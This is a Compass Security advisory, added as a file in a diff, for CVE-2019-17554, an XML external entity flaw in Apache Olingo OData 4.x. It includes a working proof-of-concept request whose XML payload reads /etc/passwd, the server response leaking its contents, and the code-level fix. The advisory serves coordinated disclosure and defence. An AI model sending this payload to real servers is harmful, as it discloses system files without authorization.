@@ -1,0 +1,121 @@
+#############################################################
+#
+# COMPASS SECURITY ADVISORY
+# https://www.compass-security.com/research/advisories/
+#
+#############################################################
+#
+# Product:  Apache Olingo OData 4.0
+# Vendor:   Apache Foundation
+# CSNC ID:  CSNC-2009-025
+# CVE ID:   CVE-2019-17554
+# Subject:  XML External Entity Resolution (XXE)
+# Risk:     High
+# Effect:   Remotely exploitable
+# Author:   Archibald Haddock (advisories@compass-security.com)
+# Date:     08.11.2019
+#
+#############################################################
+
+Introduction:
+-------------
+Apache Olingo is a Java library that implements the Open Data Protocol (OData). [1]
+XML data is parsed by insecurley configured software components, which can be abused for XML External Entity Attacks [2].
+
+
+
+Affected:
+---------
+Vulnerable:
+ * Olingo OData 4.x.x to 4.6.x
+
+Not vulnerable:
+ * Olingo OData 4.7.0
+ * The Olingo OData 2.0 implementation has XXE protection since 1.1.0-RC01
+
+Technical Description
+---------------------
+The XML content type entity deserializer is not configured to deny the resolution of external entities.
+Request with content type "application/xml", which trigger the deserialization of entities, can be used to trigger XXE attacks.
+
+Request
+======
+POST /odata-server-sample/cars.svc/Cars HTTP/1.1
+Host: localhost:8081
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://localhost:8081/odata-server-sample/
+Cookie: JSESSIONID=17C3158153CDC2CA1DBA0E77D4AFC3B0
+Upgrade-Insecure-Requests: 1
+content-type: application/xml
+Content-Length: 1101
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<a:entry xmlns:a="http://www.w3.org/2005/Atom" xmlns:m="http://docs.oasis-open.org/odata/ns/metadata" xmlns:d="http://docs.oasis-open.org/odata/ns/data" m:context="$metadata#Cars/$entity">
+  <a:id>Cars(1)</a:id>
+  <a:title></a:title>
+  <a:summary></a:summary>
+  <a:updated>2019-11-08T15:10:30Z</a:updated>
+  <a:author>
+    <a:name></a:name>
+  </a:author>
+  <a:link rel="edit" href="Cars(1)"></a:link>
+  <a:link rel="http://docs.oasis-open.org/odata/ns/related/Manufacturer" type="application/atom+xml;type=feed" title="Manufacturer" href="Cars(1)/Manufacturer"></a:link>
+  <a:category scheme="http://docs.oasis-open.org/odata/ns/scheme" term="#olingo.odata.sample.Car"></a:category>
+  <a:content type="application/xml">
+    <m:properties>
+      <d:Id m:type="Int16">1</d:Id>
+      <d:Model>F1 &xxe;</d:Model>
+      <d:ModelYear>2012</d:ModelYear>
+      <d:Price m:type="Decimal">189189.43</d:Price>
+      <d:Currency>EUR</d:Currency>
+    </m:properties>
+  </a:content>
+</a:entry>
+
+Response
+========
+HTTP/1.1 201 Created
+Server: Apache-Coyote/1.1
+OData-Version: 4.0
+Content-Type: application/xml
+Content-Length: 960
+Date: Fri, 08 Nov 2019 14:22:35 GMT
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?><a:entry xmlns:a="http://www.w3.org/2005/Atom" xmlns:m="http://docs.oasis-open.org/odata/ns/metadata" xmlns:d="http://docs.oasis-open.org/odata/ns/data" m:context="$metadata#Cars"><a:id>Cars(1)</a:id><a:title></a:title><a:summary></a:summary><a:updated>2019-11-08T15:22:35Z</a:updated><a:author><a:name></a:name></a:author><a:link rel="edit" href="Cars(1)"></a:link><a:link rel="http://docs.oasis-open.org/odata/ns/related/Manufacturer" type="application/atom+xml;type=feed" title="Manufacturer" href="Cars(1)/Manufacturer"></a:link><a:category scheme="http://docs.oasis-open.org/odata/ns/scheme" term="#olingo.odata.sample.Car"></a:category><a:content type="application/xml"><m:properties><d:Id m:type="Int16">1</d:Id><d:Model>
+myuser:x:1000:1000:,,,:/home/myuser:/bin/bash
+</d:Model><d:ModelYear>2012</d:ModelYear><d:Price m:type="Decimal">189189.43</d:Price><d:Currency>EUR</d:Currency></m:properties></a:content></a:entry>
+
+
+Workaround / Fix:
+-----------------
+Configure the XML reader securely [3].
+
+In org.apache.olingo.server.core.deserializer.xml.ODataXmlDeserializer.java on line 70 a javax.xml.stream.XMLInputFactory is instanciated:
+private static final XMLInputFactory FACTORY = XMLInputFactory.newFactory();
+
+The XMLInputFactory should be configured, not to resolve external entities:
+FACTORY.setProperty(XMLInputFactory.SUPPORT_DTD, false);
+FACTORY.setProperty("javax.xml.stream.isSupportingExternalEntities", false);
+
+
+Timeline:
+---------
+2019-11-08:     Discovery by Compass Security
+2019-11-08:     Initial vendor notification
+2019-11-08:     Initial vendor response
+2019-12-04:     Release of fixed Version / Patch [4]
+2019-12-05:     Coordinated public disclosure date
+
+
+[1] https://olingo.apache.org/
+[2] https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
+[3] https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+[4] https://mail-archives.apache.org/mod_mbox/olingo-user/201912.mbox/%3CCAGSZ4d7Ty%3DL-n_iAzT6vcQp65BY29XZDS5tMoM8MdDrb1moM7A%40mail.gmail.com%3E
+
+Source: https://www.compass-security.com/fileadmin/Datein/Research/Advisories/CSNC-2019-025_apache_xxe.txt
